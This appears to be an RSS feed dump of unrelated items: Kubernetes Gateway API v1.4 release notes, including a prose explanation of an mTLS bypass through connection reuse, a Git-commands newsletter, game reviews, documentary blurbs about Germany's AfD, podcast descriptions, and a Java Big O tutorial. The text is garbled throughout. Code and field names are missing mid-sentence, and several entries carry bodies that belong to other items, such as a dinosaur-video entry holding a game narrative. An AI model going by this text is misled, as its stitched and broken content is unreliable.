In fact, they have explicit control over which Gateways can act as a default. A Gateway will only accept these  if it is configured to do so.You can also use a ValidatingAdmissionPolicy to either require or even forbid for Routes to rely on a default Gateway.As a cluster operator, you can designate a Gateway as a default
by setting the (new)  field:Operators can choose to have no default Gateways, or even multiple.How it works and key detailsTo maintain a clean, GitOps-friendly workflow, a default Gateway does  modify the  of your Route. Instead, the binding is reflected in the Route's  field. You can always inspect the  stanza of your Route to see exactly which Gateway or Gateways have accepted it. This preserves your original intent and avoids conflicts with CD tools.The design explicitly supports having multiple Gateways designated as defaults within a cluster. When this happens, a defaulted Route will bind to  of them. This enables cluster operators to perform zero-downtime migrations and testing of new default Gateways.You can create a single Route that handles both north-south traffic (traffic entering or leaving the cluster, via a default Gateway) and east-west/mesh traffic (traffic between services within the cluster), by explicitly referencing a Service in .Default Gateways represent a significant step forward in making the Gateway API simpler and more intuitive for everyday use cases, bridging the gap between the flexibility needed by operators and the simplicity desired by developers.Configuring client certificate validationThis release brings updates for configuring client certificate validation, addressing a critical security vulnerability related to connection reuse.
HTTP connection coalescing is a web performance optimization that allows a client to reuse an existing TLS connection
for requests to different domains. While this reduces the overhead of establishing new connections, it introduces a security risk
in the context of API gateways.
The ability to reuse a single TLS connection across multiple Listeners brings the need to introduce shared client certificate
configuration in order to avoid unauthorized access.Why SNI-based mTLS is not the answerOne might think that using Server Name Indication (SNI) to differentiate between Listeners would solve this problem.
However, TLS SNI is not a reliable mechanism for enforcing security policies in a connection coalescing scenario.
A client could use a single TLS connection for multiple peer connections, as long as they are all covered by the same certificate.
This means that a client could establish a connection by indicating one peer identity (using SNI), and then reuse that connection
to access a different virtual host that is listening on the same IP address and port. That reuse, which is controlled by client side
heuristics, could bypass mutual TLS policies that were specific to the second listener configuration.Here's an example to help explain it:I have configured a Gateway with two listeners, both having overlapping hostnames.
My intention is for the  listener to be accessible only by clients presenting the  certificate.
In contrast, the  listener should allow access to a broader audience using any certificate valid for the  domain.Consider a scenario where a client initially connects to . The server requests and successfully validates the
 certificate, establishing the connection. Subsequently, the same client wishes to access other sites within this domain,
such as , which is handled by the  listener. Due to connection reuse,
clients can access  backends without an additional TLS handshake on the existing connection.
This process functions as expected.However, a critical security vulnerability arises when the order of access is reversed.
If a client first connects to  and presents a valid  certificate, the connection is successfully established.
If this client then attempts to access , the existing connection's client certificate will not be re-validated.
This allows the client to bypass the specific certificate requirement for the  backend, leading to a serious security breach.The solution: per-port TLS configurationThe updated Gateway API gains a  field in the  of a Gateway, that allows you to define a default client certificate
validation configuration for all Listeners, and then if needed override it on a per-port basis. This provides a flexible and
powerful way to manage your TLS policies.Here’s a look at the updated API definitions (shown as Go source code):Standard GRPCRoute -  field required (technicality)The promotion of GRPCRoute to Standard introduces a minor but technically breaking change regarding the presence of the top-level  field.
As part of achieving Standard status, the Gateway API has tightened the OpenAPI schema validation within the GRPCRoute
CustomResourceDefinition (CRD)
to explicitly ensure the spec field is required for all GRPCRoute resources.
This change enforces stricter conformance to Kubernetes object standards and enhances the resource's stability and predictability.
While it is highly unlikely that users were attempting to define a GRPCRoute without any specification, any existing automation
or manifests that might have relied on a relaxed interpretation allowing a completely absent  field will now fail validation
and  be updated to include the  field, even if empty.Experimental CORS support in HTTPRoute - breaking change for  fieldThe Gateway API subproject has introduced a breaking change to the Experimental CORS support in HTTPRoute, concerning the  field
within the CORS policy.
This field's definition has been strictly aligned with the upstream CORS specification, which dictates that the corresponding
Access-Control-Allow-Credentials header must represent a Boolean value.
Previously, the implementation might have been overly permissive, potentially accepting non-standard or string representations such as
 due to relaxed schema validation.
Users who were configuring CORS rules must now review their manifests and ensure the value for 
strictly conforms to the new, more restrictive schema.
Any existing HTTPRoute definitions that do not adhere to this stricter validation will now be rejected by the API server,
requiring a configuration update to maintain functionality.Improving the development and usage experienceAs part of this release, we have improved some of the developer experience workflow:Added Kube API Linter to the CI/CD pipelines, reducing the burden of API reviewers and also reducing the amount of common mistakes.Improving the execution time of CRD tests with the usage of .Additionally, as part of the effort to improve Gateway API usage experience, some efforts were made to remove some ambiguities and some old tech-debts from our documentation website:The API reference is now explicit when a field is .The GEP (GatewayAPI Enhancement Proposal) navigation bar is automatically generated, reflecting the real status of the enhancements.Unlike other Kubernetes APIs, you don't need to upgrade to the latest version of
Kubernetes to get the latest version of Gateway API. As long as you're running
Kubernetes 1.26 or later, you'll be able to get up and running with this version
of Gateway API.As of this writing, seven implementations are already conformant with Gateway API v1.4.0. In alphabetical order:Wondering when a feature will be added? There are lots of opportunities to get
involved and help define the future of Kubernetes routing APIs for both ingress
and service mesh.The maintainers would like to thank  who's contributed to Gateway
API, whether in the form of commits to the repo, discussion, ideas, or general
support. We could never have made this kind of progress without the support of
this dedicated and active community.Related Kubernetes blog articles]]></content:encoded></item><item><title>Pete Buttigieg responds to Tucker Carlson</title><link>https://www.youtube.com/shorts/DUnv39TcpXQ</link><author>Channel 5 with Andrew Callaghan</author><category>yt</category><enclosure url="https://www.youtube.com/v/DUnv39TcpXQ?version=3" length="" type=""/><pubDate>Thu, 6 Nov 2025 16:24:55 +0000</pubDate><source url="https://www.youtube.com/channel/UC-AQKm7HUNMmxjdS371MSwg">Channel 5 with Andrew Callaghan</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How does leg lengthening surgery work? - Jason Shih Hoellwarth</title><link>https://www.youtube.com/watch?v=ul-c6a4QkiU</link><author>TED-Ed</author><category>yt</category><enclosure url="https://www.youtube.com/v/ul-c6a4QkiU?version=3" length="" type=""/><pubDate>Thu, 6 Nov 2025 16:01:13 +0000</pubDate><source url="https://www.youtube.com/channel/UCsooa4yRKGN_zEE8iknghZA">TED-Ed</source><content:encoded><![CDATA[Explore the science of bone lengthening surgery, and discover the benefits and limitations of this still-developing technology.

--

Differences in leg length can emerge for various reasons, from genetic and hormonal conditions to injuries that impact bone growth. But while we still don’t know exactly what degree of difference causes health issues, doctors have made great strides in figuring out how to even out these mismatched limbs. Jason Shih Hoellwarth digs into the benefits and limitations of bone lengthening surgery.

ALL of them are super useful to anyone who writes code.Curious to know how many were new to you:A common mistake (I’ve made!)Here are some to understand before you get started:Working directory: files you’re currently editing.Staging area: a collection of changes prepared for the next commit. Local repository: full project history stored on your local machine. Remote repository: shared version of the project hosted on a server, such as GitHub or GitLab.Create a new Git repository in the current directory.Running it inside an existing repository. This can be confusing and break Git commands as it’ll create nested repositories. So check if you’re already inside a repository using .Git won’t track changes until you initialize a repository. So it’s your first step towards version controlling the files.Now that you’ve set up a repository, let’s check its current status before going further.Display the current state of the working directory and staging area. This shows which changes are staged, unstaged, or untracked.Not running it enough. This could cause some files to be overlooked or confusion about what’s added and committed. So run it often to stay aware of the repository’s state.It tells you what needs to be done - for example, what to add or commit. Plus, you can avoid surprises by viewing every change and new file.List, create, or delete branches in your repository.Assuming it switches branches when you create a new one. For example,This creates a branch, but doesn’t automatically switch to it. You stay on your current branch unless you run:You can work on various features or bug fixes without affecting the main code using branches. Besides, branches keep your work “organized and separated”, so you can experiment safely.I’m happy to partner with  on this newsletter. Code reviews usually delay feature deliveries and overload reviewers. And I genuinely believe CodeRabbit solves this problem.Switch to a different branch, or restore files from a specific commit.Switching between branches without committing or stashing your changes first. This can cause merge conflicts or prevent the switch altogether.It lets you switch between branches, try out features, or view past code. All without losing your place. Plus, it allows you to restore specific files from an earlier commit.(In newer versions, try  for clarity!)Show the difference between two versions of your files, commits, or branches.Assuming it shows all changes, but shows only UNSTAGED ones. If you want to view staged changes as well, run:It helps you catch mistakes and understand changes before committing or merging them.Shows the difference between the working directory and the last commit ().Assuming it shows only unstaged changes compared to the last commit. But it shows both STAGED and UNSTAGED changes.: shows only unstaged changes.: shows only staged changes.: shows everything that changed since the last commit.It ensures you don’t accidentally skip reviewing any changes before committing!Now that you’ve reviewed the changes... the next step is to save them to the local repository.Add changes from the working directory to the staging area.Running “” without checking what’s included. This might stage unwanted files or incomplete changes. Instead, you can stage specific files or lines using “”.→ Adds all changes in the current directory and its sub-folders. But if you’re in a sub-folder, it won’t include files in parent directories. → Adds only non-hidden files in the current directory. For example, it skips those starting with a dot, like .env or .gitignore. → Adds all changes from the repository root, including hidden files. It works from any directory in the project and is the safest way to add everything.It lets you decide what to include in the next commit. Put simply, your commit might include nothing or miss important changes if you use it wrong.Did you know?  brings real-time, AI code reviews straight into VS Code, Cursor, and Windsurf.Use it to catch bugs, security flaws, and performance issues you write code.Record staged changes in the local repository as a new snapshot.Without reviewing staged files,Without a clear commit message. This makes the commit history hard to understand.A commit is the fundamental unit of work in Git; it records what changed and why. Good commit messages make debugging, reviewing, and collaboration easier.Yet if you get interrupted before committing and need to switch tasks, you can temporarily save your current work. Let’s find out how…Temporarily save uncommitted changes so you can work on something else.Assuming it saves all changes, including new (untracked) files. But in reality, it stash only TRACKED files. So if you’ve new files, those remain in your working directory and won’t be part of the stash.You also risk losing untracked files if you then delete or clean your workspace. If you want to stash untracked files, run:It lets you pause work on a feature and switch branches without losing progress. This can be handy for quickly cleaning your workspace for a code review or hotfix. You can then return later and resume where you left off.Once you’re back to working on your project, sync the changes your team made while you were busy.Download changes from a remote repository without merging them into your code.Assuming it automatically updates your branch, which it doesn’t. You still need to merge or rebase afterward.It’s the safest way to review incoming changes before deciding to MERGE them locally.Combine changes from one branch onto another.Git will prompt you to resolve conflicts manually before completing the merge. But if you leave merge conflicts unresolved, it can create messy code and errors.This is essential for collaboration on a project. It allows team members to work in parallel and integrate their changes.Remember, a clean merge history makes tracking and debugging easier later on.Equal to running git fetch followed by git merge.Running it without reviewing changes can create conflicts. Plus, if you pull with uncommitted changes, it can create hard-to-resolve merge conflicts. Or even overwrite your local changes.It keeps your branch up to date with your team’s latest work. Re-apply commits from one branch onto another.Rebasing rewrites commit history. So if you rebase a public branch that others are working on, its history no longer matches theirs. This can create confusing conflicts and broken pull requests. Plus, it could result in data loss if commits get dropped accidentally during the process.If you want to clean up commit history and rebase with care, run this:It avoids merge commits. So you can integrate updates from the main branch onto the feature branch without cluttering the history. As a result, you have:Clean and linear commit history,Easy to understand branch evolution and pull requests.Now that your local repository is up to date with the team’s work, let’s find out how you can share your changes with others.Upload commits from the local repository to a remote one.Pushing without first pulling the latest changes from the remote repository. This can cause conflicts or reject the push operation altogether. So always pull and then RESOLVE any conflicts before pushing. This keeps the history clean and consistent across the repository.It’s how your commits become part of the shared project and keep the team aligned.Guess what? When you open a pull request,  can generate a summary of code changes for the reviewer. It helps them quickly understand complex changes and assess the impact on the codebase. Speed up the code review process.Marks a specific commit with a label, often to represent a release version.Forgetting to push tags to the remote. This means your team members won’t see those version labels in the repository. And this can create confusion about releases or version tracking. So after tagging, run this:#push all tags
git push --tags

OR

#push a specific tag
git push origin <tag>Don’t forget to confirm your tags are on the remote if you use them for deployment or release tracking.It helps you label releases and milestones in the project history. Plus, tags make the deployment and distribution of releases easier.Mistakes happen. Git provides powerful commands to fix the problems. Let’s see those next...Undo changes by moving the current branch to a specific commit. Also optionally update the staging area and working directory.Running it carelessly can make you lose hours of work without an easy recovery. For example, you’ll permanently lose your uncommitted changes by running this:Instead, do these for a safe undo…If you want to undo a commit but keep the changes staged, run this:If you want to undo a commit and move changes back to your working directory, run this:It lets you fix mistakes without creating new commits. This means you’ve full control over what your branch includes.Create a new commit to reverse the changes from an earlier commit.Assuming it removes a commit from history. Instead, it creates a new commit to undo previous changes.Here are 2 heuristics you should know:If you want to undo changes on a SHARED branch (safely), run this:If you want to remove a commit from a LOCAL branch that hasn’t been pushed yet, run this:Reverting is the safe way to undo a commit on a shared branch. It fixes mistakes from past commits without rewriting history. This way, everyone’s copies stay in sync, and you’ve a correction record.Apply a specific commit from another branch onto your current branch.Cherry-picking the same commit more than once or onto the wrong branch. This can duplicate changes and create conflicts.Here’s what you should do instead:Check the commit hash and current branch before cherry-picking.Use  or  to check if the commit already exists.It lets you apply bug fixes or backport changes without merging the entire branch. This gives you precise control over what changes move where.Finds the commit that introduced a bug by binary searching through the commit history.After running , Git puts you in a detached  state. If you forget to reset, you may continue working without being on a real branch. This can lead to confusion or lost commits.It saves you time by speeding up the debugging process. Instead of checking every commit one by one, it finds the commit that caused the bug in a few steps.If you want to collaborate effectively, you’ve got to better understand your project history. And know who made which changes. Onward.Bet you didn’t know…brings instant code reviews directly to your terminal, seamlessly integrating with Claude Code, Cursor CLI, and other AI coding agents. While they generate code, CodeRabbit ensures it’s production-ready - catching bugs, security issues, and AI hallucinations before they hit your codebase.Show the commit history of the current branch.Not knowing how to exit the log viewer. If you want to quit and return to the command line, press .The log is a record of all changes; it includes information about who made which changes and when. This helps you understand the context behind a change or debug a failure.Show who last changed each line of a file and when.Misusing it to point fingers can damage team trust and overlook the actual reasons behind a change. Instead, you should:Use it to understand code history and ask better questions.Combine it with  or  to understand the full context of a change.Remember, it’s meant to help understand code history, not to place guilt on someone. It lets you figure out why part of the code is the way it is, or find when a bug first appeared. Plus, it shows you who changed each line and which commit introduced the change. This provides context and can point you to the right person to ask about it.These 21 commands are the foundation of Git. Once you understand them, everything else is just a variation or combination.If I missed something, just let me know in the comments 👇Want to advertise in this newsletter? 📰Thank you for supporting this newsletter.You are now 180,001+ readers strong, very close to 181k.

With so many changes--including switching game engines to Unity--and numerous delays, the game simply wasn't up to standard in time. Couple this unforeseen gap year with the promise of a brand-new foundation built on an improved match engine and a completely overhauled interface, and Football Manager 26 quickly became the most highly anticipated game in the long-running series. Unfortunately, the end result is a cliched game of two halves. While the match engine is as impressive as advertised, the UI debuts with significant teething problems. Throw in some missing features and a multitude of frustrating bugs, and FM 26 would be disappointing even if expectations weren't so high.It's not all bad news, though. As I mentioned, one of the game's two halves plays some excellent football, starting with a tactical revamp that significantly alters how you set up your team on match day. It's a long-overdue shake-up, as even back in 2016, when I reviewed Football Manager 2017, I bemoaned how rigid the series' tactics had become. "The tactical side of Football Manager would benefit from giving you more control over how your team functions, especially during specific phases of play--perhaps letting you fluidly shift from one formation to another depending on whether your team has the ball or not," I said. It might've taken nine years, but this exact scenario is the basis for FM 26's tactical overhaul.There's now a clear delineation between when your team has possession and when it doesn't. If you're so inclined, you can set up to attack in a particular formation and then fluidly switch to another when defending, giving you more granular control over your team's structure. As manager of Arsenal Women--FM 26 adds 14 women's leagues for the first time--I mainly used a 4-2-3-1 formation in possession, then transitioned to a 4-4-2 shape when I didn't have the ball. As the defending team, this allowed my two forward players to lead the press while the rest of the team sat in two banks of four, providing a solid base that could also spring a counterattack whenever I won the ball back. When this happened, the three midfielders gave me more control in the middle of the pitch, and this also allowed players like Olivia Smith and Frida Maanum to play in their more natural positions behind the striker.Continue Reading at GameSpot]]></content:encoded></item><item><title>The world of open source metadata (Interview)</title><link>https://changelog.com/podcast/665</link><author></author><category>podcast</category><enclosure url="https://op3.dev/e/https://cdn.changelog.com/uploads/podcast/665/the-changelog-665.mp3" length="" type=""/><pubDate>Wed, 5 Nov 2025 20:30:00 +0000</pubDate><source url="https://changelog.com/podcast">Podcast - Changelog</source><content:encoded><![CDATA[Andrew Nesbitt builds tools and open datasets to support, sustain, and secure critical digital infrastructure.

Cosmology is in crisis. Scientists have argued for decades about how and why the universe is expanding. Now, after careful measurements using multiple methods, the main two don’t add up. What do we do when our measurements of the universe don’t match up with our models? Are all of our theories wrong?

This documentary investigates how they got there, looking at the reasons behind the surge in support for their brand of hardline nationalist politics and the roles of Russia and the U.S.

Support for nationalist, anti-immigrant parties has surged across Europe in recent years — including in Germany, where far-right leaders have risen to the brink of power for the first time since World War II.

“The Rise of Germany’s New Right” examines the recent political ascendance of the country’s far-right Alternative for Deutschland (AfD) party — exploring how it has targeted younger voters using AI videos that play on fears about immigrants and crime, how it has called for the “remigration” of immigrants who entered Germany illegally and others who had been given temporary right to stay, and how it has won vocal support from influential figures including Elon Musk and U.S. Vice President J.D. Vance. The documentary also probes allegations that Russia boosted the AfD through what one journalist calls “disinformation warfare.” 

As the film details, after World War II, Germany set out to reckon with its grim history, in part by banning Nazi symbols and slogans and criminalizing Holocaust denial. A political “firewall” was also established, with mainstream parties vowing not to work with far-right parties to govern. The documentary details how, decades later, members of the AfD have pushed back against this “remembrance culture,” become the second largest party in Germany’s parliament, and are calling for the dismantling of the “firewall,” arguing it has no place in a democracy.

Drawing on interviews with numerous AfD politicians, German intelligence service officials, political scientists, and journalists, “The Rise of Germany’s New Right” examines how and why the country reached this moment, and what it says about broader trends across Europe.

“The Rise of Germany’s New Right” is a FRONTLINE production with Mongoose Pictures in association with Evan Williams Productions. The correspondent, reporter, producer and director is Evan Williams. The producer is Hannah Congdon. The senior producer is Dan Edge. The editor-in-chief and executive producer of FRONTLINE is Raney Aronson-Rath.

Arkanoid, released not long after, expanded on its foundations, giving players more ways to play through the introduction of upgrades to your paddle, spawning additional balls, and more.These are two games that Ball x Pit designer Kenny Sun was clearly inspired by, but not the two that this modern interpretation solely borrows from. Instead, Ball x Pit is an intoxicating mash-up that includes elements of Vampire Survivors, numerous roguelites, and town-management wrapped up in an engaging adventure down a bottomless pit that is chaotic and engaging, but also slightly messy in its execution.Like its inspirations, Ball x Pit is easy to understand. You play as one of a variety of characters, each with their own abilities, flinging balls at waves of enemies slowly descending towards you. Your balls bounce off of walls and enemies to damage and eventually eliminate them, preventing them from reaching the bottom and damaging you.Continue Reading at GameSpot]]></content:encoded></item><item><title>Zohran Mamdani claps back at Andrew Cuomo</title><link>https://www.youtube.com/shorts/nNP-9dC9c8c</link><author>Channel 5 with Andrew Callaghan</author><category>yt</category><enclosure url="https://www.youtube.com/v/nNP-9dC9c8c?version=3" length="" type=""/><pubDate>Tue, 4 Nov 2025 20:08:29 +0000</pubDate><source url="https://www.youtube.com/channel/UC-AQKm7HUNMmxjdS371MSwg">Channel 5 with Andrew Callaghan</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How We Figured Out an Asteroid Killed the Dinosaurs</title><link>https://www.youtube.com/watch?v=TJY5vWXZHgI</link><author>PBS Eons</author><category>yt</category><enclosure url="https://www.youtube.com/v/TJY5vWXZHgI?version=3" length="" type=""/><pubDate>Tue, 4 Nov 2025 19:00:36 +0000</pubDate><source url="https://www.youtube.com/channel/UCzR-rom72PHN9Zg7RML9EbA">PBS Eons</source><content:encoded><![CDATA[To try everything Brilliant has to offer, visit https://brilliant.org/eons

I called out to the raider from a nearby bush. "I'm coming out, but I mean you no harm."Clearly startled by my presence and reacting based on what was more than likely a combination of the Rocketeer hovering menacingly close and a history of earlier betrayals, the dusty raider pointed his weathered Ferro rifle my way. He'd already called for the elevator to bring him back to Speranza safe and sound, so it's no wonder that he'd be anxious. He was in danger of losing everything right at the finish line, just before those saferoom doors opened. But so was I, and he didn't know-- know--that I hadn't ever killed a raider before.I could see him measuring my trustworthiness on the fly. "The robots are the bad guys, right?" I continued, sweating out the moment every second he didn't lower his gun. "If I killed you here, you'd be the first raider I've shot down. I'm just trying to get home, same as you." I kept moving so he couldn't get a clean shot at me, but I remained hopeful it wouldn't come to that. Before he could crunch the numbers on whether I was to be believed, the Rocketeer's alert status started howling something fierce. It had spotted him while he'd had his sights set on me.Continue Reading at GameSpot]]></content:encoded></item><item><title>The Evolution of AI in Cyber Security // Jeff Schwartzentruber // #344</title><link>https://podcasters.spotify.com/pod/show/mlops/episodes/The-Evolution-of-AI-in-Cyber-Security--Jeff-Schwartzentruber--344-e3agd9u</link><author>Demetrios</author><category>podcast</category><enclosure url="https://anchor.fm/s/174cb1b8/podcast/play/110686974/https%3A%2F%2Fd3ctxlq1ktw2nl.cloudfront.net%2Fstaging%2F2025-10-4%2F410591468-44100-2-7ec08f2bb2d18.mp3" length="" type=""/><pubDate>Tue, 4 Nov 2025 18:10:47 +0000</pubDate><source url="https://mlops.community/">Podcast - MLOps</source><content:encoded><![CDATA[Dr. Jeff Schwartzentruber is a Senior Machine Learning Scientist at eSentire, working on anomaly detection pipelines and the use of large language models to enhance cybersecurity operations.The Evolution of AI in Cyber Security // MLOps Podcast #344 with Jeff Schwartzentruber, Staff Machine Learning Scientist at eSentire.Modern cyber operations can feel opaque. This talk explains—step by step—what a security operations center (SOC) actually does, how telemetry flows in from networks, endpoints, and cloud apps, and what an investigation can credibly reveal about attacker behavior, exposure, and control gaps. We then trace how AI has shown up in the SOC: from rules and classic machine learning for detection to natural-language tools that summarize alerts and turn questions like “show failed logins from new countries in the last 24 hours” into fast database queries. The core of the talk is our next step: agentic investigations. These GenAI agents plan their work, run queries across tools, cite evidence, and draft analyst-grade findings—with guardrails and a human in the loop. We close with what’s next: risk-aware auto-remediation, verifiable knowledge sources, and a practical checklist for adopting these capabilities safely.Dr. Jeff Schwartzentruber holds the position of Sr. Machine Learning Scientist at eSentire – a Canadian cybersecurity company specializing in Managed Detection and Response (MDR). Dr. Schwartzentruber’s primary academic and industry research has been concentrated on solving problems at the intersection of cybersecurity and machine learning (ML). Over his +10-year career, Dr. Schwartzentruber has been involved in applying ML for threat detection and security analytics for several large Canadian financial institutions, public sector organizations (federal), and SME’s. In addition to his private sector work, Dr. Schwartzentruber is also an Adjunct Faculty at Dalhousie University in the Department of Computer Science, a Special Graduate Faculty member with the School of Computer Science at the University of Guelph, and a Sr. Advisor on AI at the Rogers Cyber Secure Catalysts.~~~~~~~~ ✌️Connect With Us ✌️ ~~~~~~~]]></content:encoded></item><item><title>Joe Rogan Experience #2405 - Luis J Gomez &amp; Big Jay Oakerson</title><link>https://www.youtube.com/watch?v=J1WyFLHPqro</link><author>PowerfulJRE</author><category>podcast</category><enclosure url="https://www.youtube.com/v/J1WyFLHPqro?version=3" length="" type=""/><pubDate>Tue, 4 Nov 2025 18:00:25 +0000</pubDate><source url="https://www.youtube.com/channel/UCzQUP1qoWDoEbmsQxvdjxgQ">Podcast - Joe Rogan</source><content:encoded><![CDATA[Luis J.

Inside, they found fake tickets for a one-way flight out of Germany on election day, designed to look like real airline boarding passes. In the field where a passenger’s name would ordinarily appear, the fake tickets read instead: ILLEGAL IMMIGRANT.

As this video drawn from the new FRONTLINE documentary "The Rise of Germany's New Right" explores, the “deportation tickets” were part of an ad campaign by Germany’s far-right, nationalist Alternative for Deutschland (AfD) party. Tens of thousands of the flyers were distributed in mailboxes and at election campaign stands  — sparking accusations that the AfD, known for its polarizing use of rhetoric, was promoting racial hatred and echoing a grim Nazi-era history in which fake one-way tickets to Jerusalem targeting Jewish people were reportedly distributed as propaganda.

“It has been reported that this particular type of ticket was very reminiscent of what the Nazis did with the Jews,” FRONTLINE correspondent Evan Williams says in the video to Marc Bernhard, the AfD official behind the campaign. “This hasn't come from nowhere in the German context. How do you respond to that?”

“Yeah, well, I'm not familiar with these actions,” Bernhard responds. “To be honest, I don't know them, nor was I aware of them.”

Weed is often seen as harmless, and in some cases, even helpful. But for many people, it can slowly become a serious problem, especially as they approach their twenties or thirties. Today, we take a closer look at how long-term daily use can affect your relationships, motivation, mental health, and life in general. Can it really be used safely? How easy is it for weed to turn into an addiction?

There’s a common idea that it takes 10,000 hours of practice to become great at something. From an early age, we are encouraged to choose our path, focus specifically, and start racking up those hours. But, what if these head starts aren’t helping us the way we think they do? What if there’s a better way to excel? David Epstein shares how a different approach could set us up for greater success.

The 2014 collab Hyrule Warriors and its sequel, Age of Calamity, are perhaps the most warmly received of them all, owing to their blend of Omega Force's overblown hack-and-slash action with The Legend of Zelda's iconic characters, locations, and enemies.With Hyrule Warriors: Age of Imprisonment, the two long-running series are more intertwined than ever, to the point where it feels more like a brand-new Zelda release than just another musou spin-off. It's not without its faults and is unlikely to convert anyone unconvinced by this style of game already, but Age of Imprisonment improves upon its predecessors in numerous ways.The game's story is the most obvious aspect where the two series are aligned. Unlike Age of Calamity and its alternate timeline ideas, Age of Imprisonment is considered canon by Nintendo, expanding on the fragments of information shown in The Legend of Zelda: Tears of the Kingdom to reveal the full extent of Hyrule's founding, Ganondorf's rise as the Demon King, and the subsequent Imprisonment War. If you've played Tears of the Kingdom, there aren't many surprises to be found here. Its most crucial story beats have already been covered, so part of the game involves revisiting these inciting incidents and exploring their aftermath.Continue Reading at GameSpot]]></content:encoded></item><item><title>Story: Godbolt&apos;s Rule - When Abstractions Fail</title><link>https://corecursive.com/godbolt-rule-matt-godbolt/</link><author></author><category>podcast</category><enclosure url="https://traffic.libsyn.com/secure/corecursive/godbolts-rule.mp3?dest-id=628353" length="" type=""/><pubDate>Tue, 4 Nov 2025 11:29:00 +0000</pubDate><source url="http://corecursive.com/">Podcast - CoRecursive</source><content:encoded><![CDATA[What do you do when your code breaks and the only fix is to dig into the runtime below?Matt Godbolt lives for that.

Check it out for more in-depth and visual explanation.Subscribe for more such videos!So… what exactly is Big O Notation?Big O is a mathematical way to describe how the performance of an algorithm changes as the size of the input grows.It doesn’t tell you the exact time your code will take.Instead, it gives you a , how fast the number of operations increases relative to the input size.For example: if your input doubles, does your algorithm take twice as long? Ten times as long? Or does it barely change at all?Big O helps you answer those questions without even running the code so you can choose the most efficient algorithm for large inputs.One important thing to note is that Big O is machine-independent.It doesn’t matter whether your code runs on a fast laptop or a slow server, the growth pattern stays the same.The key variable that drives BIG O is the . As  increases, Big O helps you predict whether the algorithm will still be efficient or become impractical.Now that you understand what Big O Notation is, let’s go over the most common time complexities you’ll encounter.This is the fastest and most efficient time complexity.An algorithm is  if it performs a fixed number of operations meaning the execution time does  depend on the size of the input.A classic example is accessing an element in an array by index.int[] a = {10, 20, 30, 40}

int x = a[3];

System.out.println(x);It doesn’t matter if the array has 10 elements…or 10 million, the time it takes to access an element Logarithmic Time – O(log n)An algorithm runs in  time when every step reduces the problem size by a constant factor (most often, by .This means the amount of work grows , even when the input becomes massive.The most common example is Binary Search.int binarySearch(int[] a, int target) {
    int lo = 0, hi = a.length - 1;
    
    while (lo <= hi) {
        int mid = lo + (hi - lo) / 2;
        if (a[mid] == target) 
          return mid;
        if (a[mid] < target) 
          lo = mid + 1;
        else 
          hi = mid - 1;
    }
    return -1;
}Each step discards 50% of the remaining data.To put that into perspective, here are the number of steps binary search takes for different input sizes.Input size = 8 → max 3 stepsInput size = 1,000 → max 10 stepsInput size = 1,000,000 → max 20 stepsInput size = 1,000,000,000 → still just 30 steps!An algorithm is  when its running time grows  to the size of the input.If the input doubles, the number of operations also doubles.A simple example is finding the maximum value in an array:int findMax(int[] array) {
    int max = array[0];
    for (int i = 1; i < array.length; i++) {
        if (array[i] > max) {
            max = array[i];
        }
    }
    return max;
}You start with some initial maxThen you scan every element and compare it to the current maxEach comparison is O(1), but you do it  times so the overall time complexity becomes .So with 10 elements, you do 10 comparisons. With 1 million elements, you do 1 million comparisons.Any algorithm that visits every element exactly once is linear time.Linearithmic Time – O(n log n)Algorithms with  time complexity combine two behaviors:A  factor from repeatedly splitting the inputAn  factor from processing or merging the piecesIt’s often described as logarithmic splitting with linear merging.The classic example is :First, it  the array in half over and over. That’s the  part.Then, it  the sorted halves back together and that takes  steps in total.Multiply those together and you get .This complexity is slightly slower than linear time, but still very efficient and it’s the backbone of many fast sorting algorithmsIn an O(n²) algorithm, the number of operations grows  to the square of the input size. So if you have n elements, you perform roughly n × n operations.This typically happens when you have , where for  you iterate over .public class NSquare {
    public int nsquare(int[] a) {
        int n = a.length;

        int pairSum = 0;

        for (int i = 0; i < n; i++) {
            for (int j = i + 1; j < n; j++) {
                pairSum += a[i] * a[j];
            }
        }

        return pairSum;
    }
}Classic examples include simple sorting algorithms like: (worst case)All of them compare or swap elements in nested loops, leading to  behavior.These algorithms are fine for small inputs, but they become painfully slow as  grows:For , you’re doing around . And if , you’re looking at  operations.In coding interviews and wherever performance matters, you’ll often want to  look for ways to bring it down to O(n log n) or better.Exponential time algorithms usually appear when we try to solve a problem by checking every possible combination often through brute force or backtracking.Think of it as the opposite of binary search: Instead of eliminating half the work at each step, you are often  the work with each extra input element.This happens in problems where each element can branch into multiple recursive calls.A classic example is generating all  (also called the power set):If the set has  elements, there are  possible subsets.That means, just for 30 elements, you’re looking at over  possibilities. And for 40? Over .:n = 20 → ~1 million possibilitiesn = 30 → ~1 billion possibilitiesn = 40 → ~1 trillion possibilitiesThis kind of growth becomes unmanageable very quickly. Even a small increase in  makes the runtime explode.But the good news is that many exponential-time problems can be optimized using techniques like  or These techniques prevent us from recomputing the same subproblems, often reducing the time from  down to a much more practical , which makes the solution usable in real-world scenarios.In general, exponential algorithms are fine only for . For anything larger, you must either optimize or rethink the approach.And finally… we’ve reached the most explosive time complexity of them all: , or This is what you get when an algorithm tries every possible arrangement of a set of  elements.The number of possibilities grows faster than any other complexity we’ve seen.By definition,  (n factorial) means: n × (n - 1) × (n - 2) × ... × 1Even at n = 15, the numbers are already in the trillions which makes it completely impractical to compute.A classic example of O(n!) is generating all permutations of a string.If you have a string of length 10 and try to print every permutation, that’s already several million operations and increasing  by just 1 doubles or triples the workload instantly.These kinds of brute-force solutions are mostly used for very small inputs. Instead, we rely on smarter techniques like ,  , or  to reduce the problem space.So far, we’ve focused on , how fast an algorithm runs as input size grows.But Big O also applies to , and that is called .In interviews, you’ll often be asked to analyze both time and space complexity —because in real systems, performance isn’t just about speed…It’s also about how much memory your solution consumes.Space complexity tells you how much  your algorithm uses in addition to the input itself.This extra memory can come from:Temporary data structures like arrays, hash maps, stacks, queues, etc.Recursion call stack framesor Intermediate buffers used during computationEven if your algorithm is fast, it may still , which can be a serious problem in large-scale systems or environments with limited RAM.Now, lets look at popular space complexities you will come across:If you scan an array to find the maximum value, you only store  to track the current max.int maxValue(int[] a) {
    int max = a[0];

    for (int i = 1; i < a.length; i++) {
        if (a[i] > max) {
            max = a[i];
        }
    }

    return max;
}So while the input size may grow, your extra space stays constant.Now suppose you collect all even numbers from the array into a new list.List<Integer> collectEvens(int[] a) {
    List<Integer> evens = new ArrayList<>();

    for (int x : a) {
        if ((x & 1) == 0)
            evens.add(x);
    }

    return evens;
